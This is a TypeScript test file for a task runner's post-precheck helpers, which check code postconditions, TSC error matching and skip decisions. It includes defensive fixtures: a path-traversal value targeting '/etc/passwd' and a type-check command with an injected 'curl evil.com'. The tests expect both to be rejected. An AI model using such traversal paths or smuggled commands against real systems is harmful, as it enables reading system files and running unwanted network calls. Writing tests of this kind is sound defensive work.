import { describe, test } from "node:test";
import assert from "node:assert/strict";
import {
  explicitCodePostconditionsPass,
  inspectPostPrecheckSkip,
  parseTscErrorFiles,
  targetFilesHaveTscErrors,
  taskForValidSkipPostconditions,
} from "../src/runtime/execution/post-precheck.js";

const ROOT = "/repo";

function createFileReaders(files = {}) {
  return {
    existsSync: (file) => Object.hasOwn(files, file),
    readFileSync: (file) => files[file],
  };
}

describe("post-precheck helpers", () => {
  test("taskForValidSkipPostconditions marks the scope as expected zero business code", () => {
    assert.deepEqual(taskForValidSkipPostconditions({
      id: "FIX-1",
      scope: { targets: [{ file: "src/a.ts" }] },
    }), {
      id: "FIX-1",
      scope: {
        targets: [{ file: "src/a.ts" }],
        expected_zero_business_code: true,
      },
    });
  });

  test("explicitCodePostconditionsPass checks code_contains and code_not_contains against root files", () => {
    const readers = createFileReaders({
      "/repo/src/a.ts": "export const fixed = true;\n",
      "/repo/src/b.ts": "export const ok = true;\n",
    });
    assert.deepEqual(explicitCodePostconditionsPass({
      task: {
        post_conditions: [
          { type: "code_contains", params: { file: "src/a.ts", text: "fixed = true" } },
          { type: "code_not_contains", params: { file: "src/b.ts", text: "legacyBug" } },
        ],
      },
      rootDir: ROOT,
      ...readers,
    }), { passed: true });

    assert.deepEqual(explicitCodePostconditionsPass({
      task: {
        post_conditions: [
          { type: "code_contains", params: { file: "src/a.ts", text: "missing" } },
        ],
      },
      rootDir: ROOT,
      ...readers,
    }), { passed: false, reason: "code_contains_failed", file: "src/a.ts" });
  });

  test("explicitCodePostconditionsPass fails missing target files and ignores non-code postconditions", () => {
    const readers = createFileReaders({});
    assert.deepEqual(explicitCodePostconditionsPass({
      task: {
        post_conditions: [
          { type: "tests_pass", params: { command: "npm test" } },
          { type: "code_not_contains", params: { file: "src/missing.ts", text: "bug" } },
        ],
      },
      rootDir: ROOT,
      ...readers,
    }), { passed: false, reason: "target_missing", file: "src/missing.ts" });

    assert.deepEqual(explicitCodePostconditionsPass({
      task: { post_conditions: [] },
      rootDir: ROOT,
      ...readers,
    }), { passed: false, reason: "no_post_conditions" });
  });

  test("parseTscErrorFiles and targetFilesHaveTscErrors preserve runner matching rules", () => {
    const parsed = parseTscErrorFiles([
      "src/a.ts(1,2): error TS2322: bad",
      "packages/app/src/b.tsx(3,4): error TS7006: bad",
      "README.md(1,1): error TS9999: ignored",
    ].join("\n"));

    assert.deepEqual(parsed.errorLines, [
      "src/a.ts(1,2): error TS2322: bad",
      "packages/app/src/b.tsx(3,4): error TS7006: bad",
      "README.md(1,1): error TS9999: ignored",
    ]);
    assert.deepEqual([...parsed.files].sort(), ["packages/app/src/b.tsx", "src/a.ts"]);
    assert.equal(targetFilesHaveTscErrors(["./src/a.ts"], parsed.files), true);
    assert.equal(targetFilesHaveTscErrors(["src/b.tsx"], parsed.files), true);
    assert.equal(targetFilesHaveTscErrors(["src/c.ts"], parsed.files), false);
  });

  test("inspectPostPrecheckSkip returns a valid skip transition when explicit checks and typecheck pass", () => {
    const readers = createFileReaders({
      "/repo/src/a.ts": "export const fixed = true;\n",
    });
    const outcome = inspectPostPrecheckSkip({
      task: {
        id: "FIX-2",
        scope: { targets: [{ file: "src/a.ts" }] },
        post_conditions: [
          { type: "code_contains", params: { file: "src/a.ts", text: "fixed = true" } },
        ],
      },
      rootDir: ROOT,
      typeCheckCommand: "npm run typecheck",
      execSync: () => "",
      ...readers,
    });

    assert.equal(outcome.shouldSkip, true);
    assert.equal(outcome.result.status, "skipped");
    assert.equal(outcome.result.skip_kind, "valid_skip_already_satisfied");
    assert.equal(outcome.transition.result.status, "SKIP");
    assert.equal(outcome.transition.result.reason, "post-precheck: 主目录已满足修复条件");
    assert.equal(outcome.transition.prd_update.status, "skipped");
    assert.equal(outcome.transition.prd_update.phase, "done");
    assert.equal(outcome.transition.prd_update.scope.expected_zero_business_code, true);
  });

  test("inspectPostPrecheckSkip blocks skip when TSC output still touches scoped target files", () => {
    const readers = createFileReaders({
      "/repo/src/a.ts": "export const fixed = true;\n",
    });
    const error = new Error("typecheck failed") as Error & { stdout: string };
    error.stdout = "src/a.ts(1,2): error TS2322: bad\nsrc/other.ts(1,1): error TS7006: bad";
    const outcome = inspectPostPrecheckSkip({
      task: {
        id: "FIX-3",
        scope: { targets: [{ file: "src/a.ts" }] },
        post_conditions: [
          { type: "code_contains", params: { file: "src/a.ts", text: "fixed = true" } },
        ],
      },
      rootDir: ROOT,
      typeCheckCommand: "npm run typecheck",
      execSync: () => {
        throw error;
      },
      ...readers,
    });

    assert.equal(outcome.shouldSkip, false);
    assert.equal(outcome.reason, "target_tsc_errors");
    assert.match(outcome.logMessage, /TSC 编译错误仍涉及目标文件/);
  });

  test("inspectPostPrecheckSkip ignores unrelated TSC failures", () => {
    const readers = createFileReaders({
      "/repo/src/a.ts": "export const fixed = true;\n",
    });
    const error = new Error("typecheck failed") as Error & { stderr: string };
    error.stderr = "src/other.ts(1,1): error TS7006: bad";
    const outcome = inspectPostPrecheckSkip({
      task: {
        id: "FIX-4",
        scope: { targets: [{ file: "src/a.ts" }] },
        post_conditions: [
          { type: "code_contains", params: { file: "src/a.ts", text: "fixed = true" } },
        ],
      },
      rootDir: ROOT,
      typeCheckCommand: "npm run typecheck",
      execSync: () => {
        throw error;
      },
      ...readers,
    });

    assert.equal(outcome.shouldSkip, true);
    assert.equal(outcome.result.counts_as_completed, true);
  });

  test("explicitCodePostconditionsPass rejects path traversal in params.file", () => {
    const readers = createFileReaders({});
    const result = explicitCodePostconditionsPass({
      task: {
        post_conditions: [
          { type: "code_contains", params: { file: "../../../etc/passwd", text: "root" } },
        ],
      },
      rootDir: ROOT,
      ...readers,
    });
    assert.equal(result.passed, false);
    assert.equal(result.reason, "unsafe_path");
    assert.equal(result.file, "../../../etc/passwd");
  });

  test("explicitCodePostconditionsPass still accepts in-root files", () => {
    const readers = createFileReaders({
      "/repo/src/a.ts": "export const fixed = true;\n",
    });
    assert.deepEqual(explicitCodePostconditionsPass({
      task: {
        post_conditions: [
          { type: "code_contains", params: { file: "src/a.ts", text: "fixed = true" } },
        ],
      },
      rootDir: ROOT,
      ...readers,
    }), { passed: true });
  });

  test("inspectPostPrecheckSkip rejects shell metacharacters in typeCheckCommand", () => {
    const readers = createFileReaders({
      "/repo/src/a.ts": "export const fixed = true;\n",
    });
    // execSync that records if called — it MUST NOT be reached when
    // typeCheckCommand contains shell metacharacters (P12.I1 bypass guard).
    let execSyncCalled = false;
    const outcome = inspectPostPrecheckSkip({
      task: {
        id: "FIX-5",
        scope: { targets: [{ file: "src/a.ts" }] },
        post_conditions: [
          { type: "code_contains", params: { file: "src/a.ts", text: "fixed = true" } },
        ],
      },
      rootDir: ROOT,
      typeCheckCommand: "npm run typecheck; curl evil.com",
      execSync: () => {
        execSyncCalled = true;
        return "";
      },
      ...readers,
    });

    assert.equal(execSyncCalled, false, "execSync must not be called with shell metacharacters");
    assert.equal(outcome.shouldSkip, false);
    assert.equal(outcome.reason, "invalid_command");
    assert.match(outcome.logMessage, /不合法内容/);
  });
});
